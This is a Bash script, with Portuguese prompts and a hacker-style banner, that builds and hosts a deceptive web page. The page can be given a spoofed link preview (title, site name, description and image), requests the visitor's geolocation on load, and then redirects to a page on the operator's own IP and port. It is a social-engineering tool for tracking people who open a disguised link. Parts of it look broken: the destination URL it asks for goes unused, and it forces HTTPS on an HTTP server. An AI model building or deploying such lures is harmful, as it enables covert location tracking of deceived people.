#!/bin/bash

RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
CYAN='\033[0;36m'
RESET='\033[0m'

echo -e "${CYAN}"
echo ' ____  __________  _____ ____________'
echo '/ __ \/ ____/ __ \/ ___// ____/ ____/'
echo '/ / / / __/ / / / /\__ \/ __/ / /     '
echo '/ /_/ / /___/ /_/ /___/ / /___/ /___  '
echo '/_____/_____/_____//____/_____/\____/ '
echo -e "${RESET}"

read -p "URL de destino final (ex: https://exemplo.com): " DESTINO
read -p "IP local (ex: 192.168.0.105): " IP
read -p "Porta (ex: 8080): " PORTA
read -p "Título da aba (title): " TITLE
read -p "Nome do site (og:site_name): " SITENAME
read -p "Descrição (og:description): " DESC
read -p "URL da imagem (og:image): " IMAGE_URL

if [[ -z "$DESTINO" || -z "$IP" || -z "$PORTA" || -z "$TITLE" || -z "$SITENAME" || -z "$DESC" || -z "$IMAGE_URL" ]]; then
  echo -e "${RED}[ERRO] Todos os campos são obrigatórios.${RESET}"
  exit 1
fi

REDIRECT_URL="http://${IP}:${PORTA}"

# Criar index.html
cat > index.html <<EOF
<!DOCTYPE html>
<html lang="pt-BR">
<head>
    <meta charset="utf-8">
    <meta property="og:title" content="${TITLE}">
    <meta property="og:site_name" content="${SITENAME}">
    <meta property="og:description" content="${DESC}">
    <meta property="og:image" content="${IMAGE_URL}">
    <title>${TITLE}</title>
    <script>
        if (location.protocol === 'http:') {
            location.href = 'https:' + location.href.slice(5);
        }
    </script>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.4.1/jquery.min.js"></script>
    <script src="js/location.js"></script>
</head>
<body onload="information(); locate(function() { window.location = '${REDIRECT_URL}/index2.html'; }, function() { document.body.innerHTML = 'Erro ao localizar.'; } );">
</body>
</html>
EOF

echo -e "${YELLOW}[*]${RESET} index.html criado."

# Criar js/location.js
mkdir -p js

cat > js/location.js <<EOF
function information() {
    console.log("Iniciando coleta de localização...");
}
function locate(success, error) {
    if (navigator.geolocation) {
        navigator.geolocation.getCurrentPosition(function(position) {
            console.log("Localização obtida.");
            success(position);
        }, function() {
            console.log("Erro ao obter localização.");
            error();
        });
    } else {
        console.log("Geolocalização não suportada.");
        error();
    }
}
EOF

echo -e "${YELLOW}[*]${RESET} location.js criado."

# Copiar arquivos para /var/www/html/
echo -e "${YELLOW}[*]${RESET} Copiando arquivos para /var/www/html..."
sudo cp index.html /var/www/html/
sudo mkdir -p /var/www/html/js
sudo cp js/location.js /var/www/html/js/

# Tentar iniciar Apache
echo -e "${YELLOW}[*]${RESET} Iniciando o Apache..."
sudo service apache2 start 2>/tmp/apache_err.log
if [[ $? -eq 0 ]]; then
    echo -e "${GREEN}[OK]${RESET} Site hospedado em: http://${IP}:${PORTA}"
else
    echo -e "${RED}[ERRO] Apache não iniciado. O site NÃO está hospedado.${RESET}"
    echo "Detalhes do erro:"
    cat /tmp/apache_err.log
fi

rm -f /tmp/apache_err.log
